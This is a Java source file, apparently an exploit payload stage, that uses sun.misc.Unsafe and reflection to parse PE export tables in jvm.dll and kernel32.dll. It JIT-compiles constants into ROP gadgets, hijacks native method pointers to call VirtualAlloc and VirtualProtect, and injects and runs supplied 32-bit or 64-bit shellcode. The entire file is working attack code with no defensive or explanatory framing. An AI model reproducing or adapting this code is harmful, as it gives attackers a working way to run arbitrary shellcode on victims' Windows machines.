import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.util.Hashtable;
import java.util.LinkedList;
import java.util.ListIterator;
import sun.misc.Unsafe;

@SuppressWarnings("unchecked")
public class MyStart implements PrivilegedAction<Object> {
    byte shellcode32[];
    byte shellcode64[];

    Unsafe unsafe;
    Hashtable<String, Long> exports;
    int sjitme;
    int sVirtualAlloc;
    int sVirtualProtect;
    int sTrampoline;
    int methodCount;
    int is64bit = 0;
    long kernel32Handle;
    long jvmHandle;
    public volatile static long v132;
    public volatile static long v164;
    public volatile static long v264;

    private native long VirtualAlloc64(long flAllocationType, long flProtect, long apiAddr,
            long lpAddress, long gadget2, long dwSize);

    private native long VirtualProtect64(long flNewProtect, long lpflOldProtect, long apiAddr,
            long lpAddress, long gadget2, long dwSize);

    private native long Trampoline64(long kernelBase, long pGetProcAddress, long shellCode,
            long dummy1, long gadget2, long dummy2);

    private native int VirtualAlloc32(int gadget1off, int apiAddr, int gadget2, int lpAddress,
            int dwSize, int flAllocationType, int flProtect);

    private native int VirtualProtect32(int gadget1off, int apiAddr, int gadget2, int lpAddress,
            int dwSize, int flNewProtect, int lpflOldProtect);

    private native int Trampoline32(int gadget1off, int shellCode, int gadget2, int kernelBase,
            int pGetProcAddress, int IsWow64Process, int dummy2);

    // charananara gadget gadget
    private static void jitme() {
        v132 = 0xC359595800E1FF50L;
        v164 = 0x00c3595828c48348L;
        v264 = 0x00e0ff48ec83485aL;
    }

    void InitHandles() throws Exception {
        Class constructorParams[] = new Class[2];
        Class params[] = new Class[1];
        Object constructorArgs[] = new Object[2];
        Object args[] = new Object[1];
        constructorParams[0] = Class.class;
        constructorParams[1] = String.class;
        constructorArgs[0] = new String("dummy").getClass();
        constructorArgs[1] = new String("dummy");
        params[0] = String.class;
        Class clazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
        Constructor nativeLibrary = clazz.getDeclaredConstructor(constructorParams);
        Method method = clazz.getDeclaredMethod("load", params);
        Field handle = clazz.getDeclaredField("handle");
        nativeLibrary.setAccessible(true);
        method.setAccessible(true);
        handle.setAccessible(true);
        Object nativeLibraryInstance = nativeLibrary.newInstance(constructorArgs);
        args[0] = new String("kernel32.dll");
        method.invoke(nativeLibraryInstance, args);
        kernel32Handle = handle.getLong(nativeLibraryInstance);
        handle.setLong(nativeLibraryInstance, 0);
        args[0] = new String("jvm.dll");
        method.invoke(nativeLibraryInstance, args);
        jvmHandle = handle.getLong(nativeLibraryInstance);

        if (kernel32Handle == 0 || jvmHandle == 0) {
            throw new Exception("");
        }
    }

    void InitSlots() throws Exception {
        String nameVirtualAlloc[] = {
                "VirtualAlloc32", "VirtualAlloc64"
        };
        String nameVirtualProtect[] = {
                "VirtualProtect32", "VirtualProtect64"
        };
        String nameTrampoline[] = {
                "Trampoline32", "Trampoline64"
        };
        Class ptype[] = {
                Integer.TYPE, Long.TYPE
        };

        Class partypes[] = new Class[7 - is64bit];
        Field f = Class.forName("java.lang.reflect.Method").getDeclaredField("slot");
        f.setAccessible(true);
        Class c = Class.forName("MyStart");
        sjitme = (Integer) f.get(c.getDeclaredMethod("jitme", new Class[0]));

        for (int x = 0; x != (7 - is64bit); ++x) {
            partypes[x] = ptype[is64bit];
        }

        sVirtualAlloc = (Integer) f.get(c.getDeclaredMethod(nameVirtualAlloc[is64bit], partypes));
        sVirtualProtect = (Integer) f.get(c.getDeclaredMethod(nameVirtualProtect[is64bit], partypes));
        sTrampoline = (Integer) f.get(c.getDeclaredMethod(nameTrampoline[is64bit], partypes));
        methodCount = c.getDeclaredMethods().length + 1;
    }

    void InitUnsafe() throws Exception {
        Field f = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        f.setAccessible(true);
        unsafe = (Unsafe) f.get(null);
    }

    void SetArch() {
        long PEheader = unsafe.getInt(jvmHandle + 60) + jvmHandle;

        if (unsafe.getShort(PEheader + 0x18) == (short) 0x020B) {
            is64bit = 1;
        }
    }

    public void ResolveExports(long address) {
        exports = new Hashtable<String, Long>();
        long PEheader = unsafe.getInt(address + 0x3c) + address;
        long exportTable = unsafe.getInt(PEheader + 120 + (16 * is64bit)) + address;
        long nFunctionNames = unsafe.getInt(exportTable + 24);
        long functionAddresses = unsafe.getInt(exportTable + 28) + address;
        long functionNames = unsafe.getInt(exportTable + 32) + address;
        long ordinalTable = unsafe.getInt(exportTable + 36) + address;

        for (long i = 0; i != nFunctionNames; ++i) {
            long functionName = unsafe.getInt(functionNames + i * 4) + address;
            long functionAddr = unsafe.getInt(functionAddresses
                    + unsafe.getShort(ordinalTable + i * 2) * 4)
                    + address;
            StringBuffer name = new StringBuffer();

            for (int x = 0; unsafe.getByte(functionName + x) != 0; ++x) {
                name.append((char) unsafe.getByte(functionName + x));
            }

            exports.put(name.toString(), functionAddr);
        }
    }

    public long getExportAddress(String name) {
        Long addr = exports.get(name);

        if (addr != null) {
            return addr;
        }

        return 0;
    }

    boolean isType(long address, String typename) throws Exception {
        long vftable = getExportAddress("??_7" + typename + "@@6B@");
        long vftable_ = ((long) unsafe.getInt(address)) & 0x00000000ffffffffL;

        if (vftable == 0) {
            return false;
        }

        if (vftable == vftable_) {
            return true;
        }

        return false;
    }

    boolean isObjectType(long address, String typename) throws Exception {
        long obj = ((long) unsafe.getInt(address + 4 + (4 * is64bit))) & 0x00000000ffffffffL;
        return isType(obj + 8 + (8 * is64bit), typename);
    }

    // TODO: mejorar esta mierda...
    boolean isValidPointer(long ptr) {
        long cmp1[] = {
                0x401000, 0x3000
        };
        long cmp2[] = {
                0x7FFFFFFF, 0x00000000ffffffffL
        };

        if (ptr > cmp1[is64bit] && ptr < cmp2[is64bit] && (ptr % (4 + (4 * is64bit))) == 0) {
            return true;
        }

        return false;
    }

    boolean isPointerNear(long ik, long ptr) {
        long mask[] = {
                0xfff00000, 0xfffffffffff00000L
        };

        if ((ik & mask[is64bit]) == (ptr & mask[is64bit])) {
            return true;
        }

        return false;
    }

    LinkedList<Long> getNullEntries(long addr, int count) {
        LinkedList<Long> results = new LinkedList<Long>();

        for (int i = 0; i < count; i += 4) {
            long slot = ((long) unsafe.getInt(addr + i)) & 0x00000000ffffffffL;

            if (slot == 0) {
                results.add(addr + i);
            }
        }

        return results;
    }

    long getMethod(long methodArray, int slot) {
        return ((long) unsafe.getInt(methodArray + (12 + (4 * is64bit)) + slot * 4)) & 0x00000000ffffffffL;
    }

    long findMethodArray() throws Exception {
        long ik = ((long) unsafe.getInt(this, (long) 4 + (4 * is64bit))) & 0x00000000ffffffffL;

        for (int x = 0; x < 0x200; x += 4) {
            long ptr = ((long) unsafe.getInt(ik + x)) & 0x00000000ffffffffL;

            if (isPointerNear(ik, ptr) && isObjectType(ptr, "objArrayKlass")
                    && unsafe.getInt(ptr + 8 + (4 * is64bit)) == methodCount) {
                long firstMethod = ((long) unsafe.getInt(ptr + 12 + (4 * is64bit))) & 0x00000000ffffffffL;

                if (isObjectType(firstMethod, "methodKlass")) {
                    return ptr;
                }
            }
        }

        throw new Exception("");
    }

    long findNmethod(long methodPtr) throws Exception {
        LinkedList<Long> nulls = getNullEntries(methodPtr, 0x200);
        ListIterator<Long> it = nulls.listIterator(0);

        for (int i = 0; i != 50000; ++i) {
            jitme();
        }

        Thread.sleep(1000);

        while (it.hasNext()) {
            long addr = it.next();
            long mptr = ((long) unsafe.getInt(addr)) & 0x00000000ffffffffL;

            if (isValidPointer(mptr) && isPointerNear(methodPtr, mptr) == false
                    && isType(mptr, "nmethod")) {
                return mptr;
            }
        }

        throw new Exception("");
    }

    long findNativeCode(long nmethod) throws Exception {
        for (int i = 0; i < 0x200; i += 4) {
            long nmethodSlot = ((long) unsafe.getInt(nmethod + i)) & 0x00000000ffffffffL;

            if (isPointerNear(nmethod, nmethodSlot) && nmethodSlot > nmethod) {
                return nmethodSlot;
            }
        }

        throw new Exception("");
    }

    long findNativeMethodPointer(long methodPtr) throws Exception {
        long PEheader = unsafe.getInt(jvmHandle + 60) + jvmHandle;
        long codeStarts = unsafe.getInt(PEheader + 0x2C) + jvmHandle;
        long codeEnds = codeStarts + unsafe.getInt(PEheader + 0x1C);

        for (int i = 0; i < 0x200; i += 4) {
            long slot = ((long) unsafe.getInt(methodPtr + i)) & 0x00000000ffffffffL;

            if (slot >= codeStarts && slot < codeEnds) {
                return methodPtr + i;
            }
        }

        throw new Exception("");
    }

    LinkedList<Integer> findGadgets(long nmethod) throws Exception {
        LinkedList<Integer> results = new LinkedList<Integer>();
        long codePtr = findNativeCode(nmethod);
        int gadget1 = 0;
        int gadget2 = 0;

        byte g1bytes32[] = {
                (byte) 0x58, (byte) 0x59, (byte) 0x59, (byte) 0xC3
        };
        byte g2bytes32[] = {
                (byte) 0x50, (byte) 0xFF, (byte) 0xE1
        };
        byte g1bytes64[] = {
                (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x58, (byte) 0x59,
                (byte) 0xC3
        };
        byte g2bytes64[] = {
                (byte) 0x5A, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x48, (byte) 0xFF,
                (byte) 0xE0
        };
        byte[] g1bytes[] = {
                g1bytes32, g1bytes64
        };
        byte[] g2bytes[] = {
                g2bytes32, g2bytes64
        };

        if (codePtr != 0) {
            for (int x = 0; x != 0x100; ++x) {
                int y;

                for (y = 0; y != g1bytes[is64bit].length; ++y) {
                    if (unsafe.getByte(codePtr + x + y) != g1bytes[is64bit][y]) {
                        break;
                    }
                }

                if (y == g1bytes[is64bit].length) {
                    gadget1 = (int) (codePtr + x);
                }

                for (y = 0; y != g2bytes[is64bit].length; ++y) {
                    if (unsafe.getByte(codePtr + x + y) != g2bytes[is64bit][y]) {
                        break;
                    }
                }

                if (y == g2bytes[is64bit].length) {
                    gadget2 = (int) (codePtr + x);
                }

                if (gadget1 != 0 && gadget2 != 0) {
                    results.add(gadget1);
                    results.add(gadget2);
                    return results;
                }
            }
        }

        throw new Exception("");
    }

    void InjectShellcode32(int gadget1, int gadget2) throws Exception {
        int size = shellcode32.length + shellcode64.length;
        int oldProt = (int) unsafe.allocateMemory(4);
        int addr = (int) VirtualAlloc32(gadget1, (int) getExportAddress("VirtualAlloc"), gadget2, 0,
                size, 0x2000 | 0x1000, 0x04);

        for (int x = 0; x != shellcode32.length; ++x) {
            unsafe.putByte(addr + x, shellcode32[x]);
        }

        for (int x = 0; x != shellcode64.length; ++x) {
            unsafe.putByte(addr + shellcode32.length + x, shellcode64[x]);
        }

        VirtualProtect32(gadget1, (int) getExportAddress("VirtualProtect"), gadget2, addr, size,
                0x20, oldProt);
        Trampoline32(gadget1, addr, gadget2, (int) kernel32Handle,
                (int) getExportAddress("GetProcAddress"), (int) getExportAddress("IsWow64Process"), 0);
    }

    void InjectShellcode64(long gadget2) throws Exception {
        long oldProt = unsafe.allocateMemory(8);
        long addr = VirtualAlloc64(0x2000L | 0x1000L, 0x04L, getExportAddress("VirtualAlloc"), 0,
                gadget2, (long) shellcode64.length);

        for (int x = 0; x != shellcode64.length; ++x) {
            unsafe.putByte(addr + x, shellcode64[x]);
        }

        VirtualProtect64(0x20L, oldProt, getExportAddress("VirtualProtect"), addr, gadget2, (long) shellcode64.length);
        Trampoline64(kernel32Handle, getExportAddress("GetProcAddress"), addr, 0L, gadget2, 0L);
    }

    public MyStart(byte shellcode1[], byte shellcode2[]) {
        shellcode32 = shellcode1;
        shellcode64 = shellcode2;
        AccessController.doPrivileged(this);
    }

    public Object run() {
        try {
            InitHandles();
            InitUnsafe();
            SetArch();
            InitSlots();
            ResolveExports(jvmHandle);
            long methodArray = findMethodArray();
            long nmpVirtualAlloc = findNativeMethodPointer(getMethod(methodArray, sVirtualAlloc));
            long nmpVirtualProtect = findNativeMethodPointer(getMethod(methodArray, sVirtualProtect));
            long nmpTrampoline = findNativeMethodPointer(getMethod(methodArray, sTrampoline));
            long nmethod = findNmethod(getMethod(methodArray, sjitme));
            LinkedList<Integer> gadgets = findGadgets(nmethod);
            ResolveExports(kernel32Handle);
            unsafe.putInt(nmpVirtualAlloc, gadgets.getFirst());
            unsafe.putInt(nmpVirtualProtect, gadgets.getFirst());
            unsafe.putInt(nmpTrampoline, gadgets.getFirst());

            if (is64bit == 1) {
                InjectShellcode64(((long) gadgets.getLast()) & 0x00000000ffffffffL);
            } else {
                InjectShellcode32((int) (gadgets.getFirst() + 2), (int) (gadgets.getLast() + 0));
            }
        } catch (Exception e) {
            System.out.println("mierda");
        }

        return null;
    }
}
